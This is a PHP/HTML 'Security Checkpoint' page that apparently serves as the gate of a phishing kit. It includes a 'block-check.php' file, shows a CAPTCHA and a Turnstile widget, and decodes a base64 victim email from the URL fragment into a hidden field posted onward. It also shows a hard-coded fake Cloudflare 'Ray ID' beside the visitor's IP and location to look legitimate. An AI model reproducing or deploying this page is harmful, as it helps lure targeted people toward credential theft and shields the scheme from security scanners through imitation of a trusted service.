<?php
include 'block-check.php';
$turnstileSiteKey = getenv('TURNSTILE_SITE_KEY');
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Identity</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        :root {
            --primary-color: #6366f1;
            --primary-hover: #4f46e5;
            --background: #f8fafc;
            --card-bg: #ffffff;
            --text-primary: #1e293b;
            --text-secondary: #64748b;
            --border-color: #e2e8f0;
        }

        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            font-family: system-ui, -apple-system, sans-serif;
            background-color: var(--background);
            background-image: 
                radial-gradient(circle at 100% 100%, rgba(99, 102, 241, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 0% 0%, rgba(99, 102, 241, 0.05) 0%, transparent 50%);
            color: var(--text-primary);
        }

        .container {
            background-color: var(--card-bg);
            padding: 2.5rem;
            width: 100%;
            max-width: 440px;
            border-radius: 24px;
            box-shadow: 0px 4px 6px -1px rgba(0, 0, 0, 0.1),
                        0px 2px 4px -1px rgba(0, 0, 0, 0.06);
            margin: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .header-icon {
            background-color: rgba(99, 102, 241, 0.1);
            color: var(--primary-color);
            width: 48px;
            height: 48px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
        }

        h1 {
            font-size: 1.5rem;
            font-weight: 600;
            margin: 0;
            color: var(--text-primary);
        }

        .description {
            font-size: 0.95rem;
            color: var(--text-secondary);
            margin: 0.75rem 0 2rem;
            text-align: center;
            line-height: 1.6;
        }

        label {
            font-size: 0.875rem;
            font-weight: 500;
            display: block;
            margin-bottom: 0.5rem;
            color: var(--text-primary);
        }

        .captcha-container {
            background-color: var(--background);
            padding: 1.5rem;
            border-radius: 16px;
            margin-bottom: 1.5rem;
        }

        .captcha-image {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 0.75rem;
            justify-content: center;
            background-color: white;
            padding: 1rem;
            border-radius: 12px;
            border: 1px solid var(--border-color);
        }

        .captcha-input {
            font-size: 1rem;
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            box-sizing: border-box;
            margin-top: 0.75rem;
            transition: all 0.2s ease;
            background-color: white;
        }

        .captcha-input:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .refresh-button {
            padding: 8px;
            border: 1px solid var(--border-color);
            background-color: white;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .refresh-button:hover {
            background-color: var(--background);
        }

        .next-button {
            padding: 0.875rem;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-size: 0.95rem;
            font-weight: 500;
            width: 100%;
            transition: all 0.2s ease;
        }

        .next-button:disabled {
            background-color: var(--text-secondary);
            opacity: 0.7;
            cursor: not-allowed;
        }

        .next-button:hover:not(:disabled) {
            background-color: var(--primary-hover);
            transform: translateY(-1px);
        }

        .cf-turnstile {
            margin: 1.5rem 0;
            display: flex;
            justify-content: center;
        }

        .helper-text {
            font-size: 0.875rem;
            color: var(--text-secondary);
            margin-top: 1.5rem;
            text-align: center;
            padding-top: 1.5rem;
            border-top: 1px solid var(--border-color);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-icon">
                <i class="fas fa-shield-alt" style="font-size: 1.5rem;"></i>
            </div>
            <h1>Security Checkpoint</h1>
            <p class="description">Please complete the CAPTCHA below to verify that you are not a robot and proceed.</p>
        </div>
        <form id="captcha-form" action="/validate_captcha.php" method="POST">
            <input type="hidden" id="email" name="email">

            <div class="captcha-container">
                <label for="text-captcha">Security Check</label>
                <div class="captcha-image">
                    <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image" style="max-width: 120px;">
                    <button type="button" onclick="refreshCaptcha()" class="refresh-button">
                        <i class="fas fa-sync-alt" style="color: var(--primary-color);"></i>
                    </button>
                </div>
                <input type="text" id="text-captcha" name="text_captcha" class="captcha-input" placeholder="Enter the characters above" required>
            </div>

            <div class="cf-turnstile" data-sitekey="0x4AAAAAAA0DYZjZ9s2HydTY" data-callback="onTurnstileVerified"></div>

            <button id="next-button" class="next-button" type="submit" disabled>Continue</button>
        </form>
        <div id="user-info" class="helper-text"></div>
    </div>

    <script>
        async function fetchUserInfo() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                if (response.ok) {
                    const data = await response.json();
                    const ua = navigator.userAgent;
                    const userInfo = `
                        <strong>IP:</strong> ${data.ip} <br>
                        <strong>Location:</strong> ${data.city}, ${data.region}, ${data.country_name} <br>
                        <strong>Device/UA:</strong> ${ua}
                    `;
                    document.getElementById("user-info").innerHTML = userInfo;
                } else {
                    document.getElementById("user-info").innerText = "Ray ID: 8dfcfbe7e9cc36bc";
                }
            } catch (error) {
                console.error("Error fetching user info:", error);
                document.getElementById("user-info").innerText = "Ray ID: 8dfcfbe7e9cc36bc";
            }
        }

        window.addEventListener("DOMContentLoaded", fetchUserInfo);

        function refreshCaptcha() {
            document.getElementById("captcha-image").src = "/generate_captcha.php?" + Date.now();
        }

        function onTurnstileVerified(token) {
            document.getElementById('next-button').disabled = false;
        }

        function prefillEmail() {
    // Get the hash part of the URL (everything after #)
    const hash = window.location.hash;
    
    if (hash) {
        // Remove the # character
        const base64Email = hash.substring(1);
        try {
            // Try to decode it (whether it's base64 or not)
            const email = atob(base64Email);
            document.getElementById('email').value = email;
        } catch {
            // If it's not base64 encoded, use it directly
            document.getElementById('email').value = base64Email;
        }
    }
}

        window.onload = prefillEmail;
    </script>
</body>
</html>
